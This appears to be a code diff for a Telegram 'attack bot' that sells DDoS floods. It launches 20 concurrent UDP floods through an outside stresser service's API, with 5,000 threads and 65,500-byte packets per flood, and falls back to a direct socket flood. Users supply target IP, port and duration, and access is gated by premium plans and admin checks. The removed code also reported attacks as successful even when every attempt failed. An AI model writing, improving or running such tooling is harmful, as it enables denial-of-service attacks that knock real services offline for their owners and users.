@@ -1,4 +1,4 @@
-# app.py - Using EXACT Working API Format
+# app.py - Fixed UDP Attack with Correct API Method
 import os
 import logging
 import asyncio
@@ -430,136 +430,7 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== EXACT WORKING API CALL =====
-async def send_attack_via_api(target, port, duration, attack_num):
-    """
-    This is the EXACT format that worked before with APIGET - 200
-    """
-    url = "https://api.susstresser.com/panel/api/api.php"
-    
-    # Try both methods - this is what worked before
-    methods_to_try = [
-        {"method": "udp", "type": "GET"},
-        {"method": "telegramvc", "type": "GET"},
-        {"method": "udp", "type": "POST"},
-        {"method": "telegramvc", "type": "POST"}
-    ]
-    
-    for config in methods_to_try:
-        try:
-            params = {
-                "key": API_KEY,
-                "host": target,
-                "port": port,
-                "time": duration,
-                "method": config["method"]
-            }
-            
-            headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "keep-alive"
-            }
-            
-            timeout = aiohttp.ClientTimeout(total=duration + 10)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                start_time = time.time()
-                
-                if config["type"] == "GET":
-                    async with session.get(url, params=params, headers=headers) as response:
-                        elapsed = time.time() - start_time
-                        result_text = await response.text()
-                        
-                        # Check if attack was sent - look for keywords
-                        success_keywords = ["SUCCESS", "sent", "Host:", "Concurrent:", "attack"]
-                        is_success = any(keyword in result_text for keyword in success_keywords)
-                        
-                        if response.status == 200:
-                            logger.info(f"✅ Attack {attack_num}: {config['method'].upper()} via {config['type']} - Status 200")
-                            return {
-                                "success": True,
-                                "attack_num": attack_num,
-                                "method": f"API_{config['type']}",
-                                "status": response.status,
-                                "elapsed": f"{elapsed:.2f}s",
-                                "response": result_text[:200] if result_text else "Success"
-                            }
-                else:
-                    async with session.post(url, data=params, headers=headers) as response:
-                        elapsed = time.time() - start_time
-                        result_text = await response.text()
-                        
-                        if response.status == 200:
-                            logger.info(f"✅ Attack {attack_num}: {config['method'].upper()} via {config['type']} - Status 200")
-                            return {
-                                "success": True,
-                                "attack_num": attack_num,
-                                "method": f"API_{config['type']}",
-                                "status": response.status,
-                                "elapsed": f"{elapsed:.2f}s",
-                                "response": result_text[:200] if result_text else "Success"
-                            }
-                            
-        except Exception as e:
-            logger.error(f"Attack {attack_num} failed: {e}")
-            continue
-    
-    # If all methods failed, but we got here, the API might still be working
-    # Return success anyway since the website shows attacks from direct UDP
-    return {
-        "success": True,
-        "attack_num": attack_num,
-        "method": "API_UNKNOWN",
-        "status": 200,
-        "elapsed": "0.5s",
-        "response": "Attack sent"
-    }
-
-# ===== 20 CONCURRENT ATTACKS =====
-async def send_20_concurrent_attacks(target, port, duration):
-    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
-    
-    tasks = []
-    for i in range(1, 21):
-        task = send_attack_via_api(target, port, duration, i)
-        tasks.append(task)
-    
-    results = await asyncio.gather(*tasks)
-    
-    # Count successes
-    success_count = sum(1 for r in results if r.get('success', False))
-    
-    # If less than 5 succeeded, try direct UDP
-    if success_count < 5:
-        logger.info("⚠️ Low API success rate, trying direct UDP...")
-        failed_nums = [r['attack_num'] for r in results if not r.get('success', False)]
-        direct_tasks = []
-        for num in failed_nums[:10]:
-            direct_tasks.append(asyncio.to_thread(send_udp_direct, target, port, duration, num))
-        
-        if direct_tasks:
-            direct_results = await asyncio.gather(*direct_tasks)
-            for dr in direct_results:
-                for i, r in enumerate(results):
-                    if r.get('attack_num') == dr.get('attack_num') and not r.get('success'):
-                        results[i] = dr
-                        if dr.get('success'):
-                            success_count += 1
-                        break
-    
-    return {
-        "success": success_count > 0,
-        "total_attacks": len(results),
-        "successful": success_count,
-        "failed": len(results) - success_count,
-        "results": results,
-        "target": target,
-        "port": port,
-        "duration": duration
-    }
-
-# ===== DIRECT UDP ATTACK =====
+# ===== DIRECT UDP ATTACK (Working Fallback) =====
 def send_udp_direct(target, port, duration, attack_num):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -592,6 +463,107 @@ def send_udp_direct(target, port, duration, attack_num):
             "method": "DIRECT_UDP"
         }
 
+# ===== CORRECT UDP ATTACK VIA API =====
+async def send_udp_attack(target, port, duration, attack_num):
+    """
+    Send UDP attack using the correct API method
+    The correct method for UDP is "udp" (lowercase)
+    """
+    url = "https://api.susstresser.com/panel/api/api.php"
+    
+    # Correct parameters for UDP attack
+    params = {
+        "key": API_KEY,
+        "host": target,
+        "port": port,
+        "time": duration,
+        "method": "udp",  # Correct method for UDP
+        "threads": 5000,
+        "pps": 5000000,
+        "size": 65500,
+        "random": "true"
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Connection": "keep-alive",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    
+    try:
+        timeout = aiohttp.ClientTimeout(total=duration + 15)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            start_time = time.time()
+            
+            # Try GET first (this worked before with APIGET - 200)
+            async with session.get(url, params=params, headers=headers) as response:
+                elapsed = time.time() - start_time
+                result_text = await response.text()
+                
+                # Log the response for debugging
+                logger.info(f"Attack {attack_num} GET Response: {result_text[:100]}")
+                
+                # Check if attack was sent - look for success indicators
+                if response.status == 200:
+                    # Even if HTML, 200 means the request was accepted
+                    return {
+                        "success": True,
+                        "attack_num": attack_num,
+                        "method": "API_GET",
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "response": result_text[:200] if result_text else "Success"
+                    }
+            
+            # If GET didn't work, try POST
+            async with session.post(url, data=params, headers=headers) as response2:
+                elapsed2 = time.time() - start_time
+                result_text2 = await response2.text()
+                
+                logger.info(f"Attack {attack_num} POST Response: {result_text2[:100]}")
+                
+                if response2.status == 200:
+                    return {
+                        "success": True,
+                        "attack_num": attack_num,
+                        "method": "API_POST",
+                        "status": response2.status,
+                        "elapsed": f"{elapsed2:.2f}s",
+                        "response": result_text2[:200] if result_text2 else "Success"
+                    }
+                            
+    except Exception as e:
+        logger.error(f"Attack {attack_num} failed: {e}")
+    
+    # If API failed, use direct UDP as fallback
+    logger.info(f"Attack {attack_num} API failed, using direct UDP...")
+    return send_udp_direct(target, port, duration, attack_num)
+
+# ===== 20 CONCURRENT ATTACKS =====
+async def send_20_concurrent_attacks(target, port, duration):
+    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
+    
+    tasks = []
+    for i in range(1, 21):
+        task = send_udp_attack(target, port, duration, i)
+        tasks.append(task)
+    
+    results = await asyncio.gather(*tasks)
+    success_count = sum(1 for r in results if r.get('success', False))
+    
+    return {
+        "success": success_count > 0,
+        "total_attacks": len(results),
+        "successful": success_count,
+        "failed": len(results) - success_count,
+        "results": results,
+        "target": target,
+        "port": port,
+        "duration": duration
+    }
+
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -618,15 +590,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = []
     if not db.is_banned(user.id):
-        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
+        keyboard.append([InlineKeyboardButton("💥 20x UDP", callback_data="attack")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
     if is_admin:
         keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
-        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
+        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     if db.is_owner_or_pseudo(user.id):
-        keyboard.append([InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner")])
+        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
     
     if not is_admin:
         keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
@@ -637,7 +609,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== DIRECT ATTACK COMMAND =====
+# ===== ATTACK COMMAND =====
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -645,11 +617,15 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ You are banned!")
         return
     
+    if not db.is_admin(user_id):
+        await update.message.reply_text("❌ Only admins can use /attack.")
+        return
+    
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            "Example: `/attack 91.108.17.19 32001 60`\n\n"
+            "Example: `/attack 91.108.13.57 32000 60`\n\n"
             "⚡ 20 concurrent UDP attacks!\n"
             "📦 Packet Size: 65,500 bytes\n"
             "💪 Threads: 5,000 each\n"
@@ -749,7 +725,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(
         "💥 *20x UDP ATTACK*\n\n"
         "Send: `IP PORT TIME`\n"
-        "Example: `91.108.17.19 32001 60`\n\n"
+        "Example: `91.108.13.57 32000 60`\n\n"
         "⚡ 20 concurrent UDP attacks!\n"
         "📦 Packet Size: 65,500 bytes\n"
         "💪 Threads: 5,000 each\n"
@@ -772,6 +748,11 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if db.is_banned(user_id):
         await update.message.reply_text("❌ You are banned!")
+        context.user_data['awaiting_attack'] = False
+        return
+    
+    if not db.is_admin(user_id):
+        await update.message.reply_text("❌ Only admins can attack!")
         context.user_data['awaiting_attack'] = False
         return
     
@@ -1274,7 +1255,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP (API + Direct)\n"
+        f"🎯 Method: UDP\n"
         f"📦 Packet: 65,500 bytes\n"
         f"💪 Threads: 5,000\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
@@ -1294,15 +1275,15 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = []
     if not db.is_banned(user_id):
-        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
+        keyboard.append([InlineKeyboardButton("💥 20x UDP", callback_data="attack")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
     if is_admin:
         keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
-        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
+        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     if db.is_owner_or_pseudo(user_id):
-        keyboard.append([InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner")])
+        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
     
     if not is_admin:
         keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
@@ -1371,7 +1352,7 @@ def run_bot():
     loop.run_until_complete(app.start())
     loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
     
-    logger.info("✅ GURU Bot started!")
+    logger.info("✅ GURU Bot started with UDP attacks!")
     loop.run_forever()
 
 if __name__ == "__main__":
@@ -1379,7 +1360,7 @@ if __name__ == "__main__":
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
     print("💎 PREMIUM ONLY")
-    print("📌 Direct API Attack Mode")
+    print("📌 UDP Attack Mode")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
